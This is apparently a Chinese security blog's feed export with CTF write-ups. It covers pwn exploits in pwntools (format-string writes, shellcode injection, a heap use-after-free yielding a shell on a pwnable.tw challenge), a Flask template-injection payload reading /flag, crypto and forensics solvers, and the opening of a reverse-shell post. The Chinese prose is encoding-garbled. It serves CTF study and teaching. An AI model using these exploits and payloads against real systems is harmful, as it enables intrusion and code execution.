<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p>
<p>æ€è·¯ï¼šå°†xçš„åœ°å€æ”¾åˆ°æ ˆä¸Šï¼Œå¯¹åº”çš„è·å–æ ˆä¸Šçš„åœ°å€ç›¸å¯¹äº<code>printf</code>çš„ç¬¬å‡ ä¸ªå‚æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>è¿™é¢˜å¾ˆå¥‡æ€ª X64  æ„Ÿè§‰æ˜¯çˆ†ç ´å‡ºæ¥çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure>
<h3 id="fmstr-uaf"><a href="#fmstr-uaf" class="headerlink" title="fmstr_uaf"></a>fmstr_uaf</h3><p>RWXæ‰“å¼€ï¼Œè¯´æ˜åº”è¯¥æ˜¯è¿”å›shellcode</p>
<p>ä¹Ÿå°±æ˜¯æ ˆä¸Šå†™shellcode</p>
<p>æ­¤å¤–ï¼Œè¿˜éœ€è¦åˆ©ç”¨å †è¿›è¡ŒUAF</p>
<p>è¿›è¡Œshellcodeçš„è°ƒç”¨</p>
<p>åŒæ—¶è¿˜æœ‰fmstræ³„éœ²mainâ€™rbpçš„ä½ç½®</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png" alt="image-20201122165900691"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./echo2"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./echo2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">shellcode=<span class="string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b"%10$p"</span>+<span class="string">b"A"</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>)</span><br><span class="line">shellcode_addr=int(p.recvuntil(<span class="string">b'AAA'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"to exit? (y/n)"</span>)</span><br><span class="line">p.sendline(<span class="string">b"n"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"hello \n"</span>)</span><br><span class="line">p.sendline(<span class="string">b"A"</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="å †-1"><a href="#å †-1" class="headerlink" title="å †"></a>å †</h2><h3 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png" alt="image-20201122225712975"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png" alt="image-20201122225952773"></p>
<p>é¦–å…ˆéœ€è¦æä¸¤ä¸ªchunk(8byte)ï¼Œfreeåï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬fastbinä¸­å°±ä¼šæœ‰ä¸¤ä¸ª8byteçš„chunk</p>
<p>ä¹‹åæˆ‘ä»¬åœ¨åˆ†é…1ä¸ªchunkï¼Œç”±äºfastbinçš„ç¼˜æ•…</p>
<p>æˆ‘ä»¬å°±ä¼šæŠŠptr[1]ä¸­çš„chunkç›´æ¥æ‹¿è¿‡æ¥</p>
<p>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶content sizeä¸º8 æˆ‘ä»¬ä¹Ÿå°±æŠŠptr[0]ä¸­çš„chunkæ‹¿äº†è¿‡æ¥</p>
<p>ä»è€Œè¾¾åˆ°äº†UAF</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png" alt="image-20201122231126664"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png" alt="image-20201122231528599"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(*ptr[v1])(ptr[v1]);</span><br><span class="line">int self_puts(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process("./hacknote")</span></span><br><span class="line">elf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">delete_note(<span class="string">b'0'</span>)</span><br><span class="line">delete_note(<span class="string">b'1'</span>)</span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b'2'</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfsys)+<span class="string">b"||sh"</span>)</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>â€‹       </p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMT2020åä¸ºæ¯</title>
    <url>/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="CUMTåä¸ºæ¯"><a href="#CUMTåä¸ºæ¯" class="headerlink" title="CUMTåä¸ºæ¯"></a>CUMTåä¸ºæ¯</h1><p>webç‹—æ´»æˆäº†å„æ–¹å‘ç­¾åˆ°æ‰‹â€¦</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>æ¨¡æ¿æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12æ‘‡å¥–å¾—flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>å¼‚æˆ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>å››å…ƒä¸€æ¬¡æ–¹ç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>ç»´å‰å°¼äºšå¯†ç ï¼Œä¸Šç½‘downè„šæœ¬ï¼ŒçŒœå¯†é’¥ï¼Œè·‘å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikzâ€™wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izrâ€™m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csgâ€™v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>å¤§æ•°e</p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯wiener attack</p>
<p>ä¸Šç½‘ç›´æ¥downè„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>è½¬base64åœ¨è½¬brainfk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‡ºä¸ªæµé‡åˆ†æå§"><a href="#å‡ºä¸ªæµé‡åˆ†æå§" class="headerlink" title="å‡ºä¸ªæµé‡åˆ†æå§"></a>å‡ºä¸ªæµé‡åˆ†æå§</h2><p>httpæµbase64è§£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‡ºä¸ªLSBå§"><a href="#å‡ºä¸ªLSBå§" class="headerlink" title="å‡ºä¸ªLSBå§"></a>å‡ºä¸ªLSBå§</h2><p>LSBéšå†™</p>
<p>red green blue 0 0 0</p>
<p>ä¿å­˜å¾—äºŒç»´ç  æ‰«å¾—flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‡ºä¸ªä¼ªwebå§"><a href="#å‡ºä¸ªä¼ªwebå§" class="headerlink" title="å‡ºä¸ªä¼ªwebå§"></a>å‡ºä¸ªä¼ªwebå§</h2><p>æŸ¥çœ‹æœ€æ–°ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´</p>
<p>å¯ä»¥çœ‹åˆ°passä¸­æœ‰æ˜æ˜¾å­—ç¬¦ä¸²cumt</p>
<p>ç„¶åæ‹¿flagåŒ…è£¹å°±è¡Œ</p>
<h2 id="å‡ºä¸ªæ–‡æ¡£å§"><a href="#å‡ºä¸ªæ–‡æ¡£å§" class="headerlink" title="å‡ºä¸ªæ–‡æ¡£å§"></a>å‡ºä¸ªæ–‡æ¡£å§</h2><p>éšè—æ–‡å­—</p>
<h2 id="å†…å­˜å–è¯"><a href="#å†…å­˜å–è¯" class="headerlink" title="å†…å­˜å–è¯"></a>å†…å­˜å–è¯</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æœ‰flag.pngï¼Œè¾“å‡ºä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡æ‰«ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>
<p>è§£ä¸å‡ºæ¥</p>
<p>æŸ¥çœ‹ç³»ç»Ÿçª—å£åˆ—è¡¨ï¼Œçœ‹æœ‰æ²¡æœ‰å’Œflagæœ‰å…³çš„ç¨‹åº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç¨‹åºdumpä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>
<p>ç”¨foremoståˆ†ç¦»ä¸€ä¸‹</p>
<p>å¯ä»¥çœ‹åˆ°æœ‰å›¾ç‰‡</p>
<p>æœ‰keyå€¼å’Œvi ç„¶åå°±æ˜¯AESåŠ å¯†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‡ºä¸ªå‹ç¼©åŒ…å§"><a href="#å‡ºä¸ªå‹ç¼©åŒ…å§" class="headerlink" title="å‡ºä¸ªå‹ç¼©åŒ…å§"></a>å‡ºä¸ªå‹ç¼©åŒ…å§</h2><p>010æ‰“å¼€ä¹‹åå‘ç°æœ‰secret.pngæ²¡æœ‰ä¼ªåŠ å¯†ï¼Œå¾ˆæ˜æ˜¾å­å—è¢«ä¿®æ”¹</p>
<p>7aæ”¹æˆ74</p>
<p>åˆ†ç¦»å‡ºsecret.png</p>
<p>å‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä½†æœ‰ä¸¤å¸§</p>
<p>è„±åˆ°stegé‡Œé¢å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ®‹ç¼ºçš„äºŒç»´ç </p>
<p>è¡¥å…¨ï¼Œå°±å¯ä»¥çœ‹åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>é¢˜è§£</tag>
      </tags>
  </entry>
  <entry>
    <title>åå¼¹shellæ€»ç»“</title>
    <url>/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘é‡åˆ°åå¼¹shellï¼Œæ€»ç»“ä¸€ä¸‹åå¼¹shellï¼Œç”¨æ¥åšç¬”è®°</p>
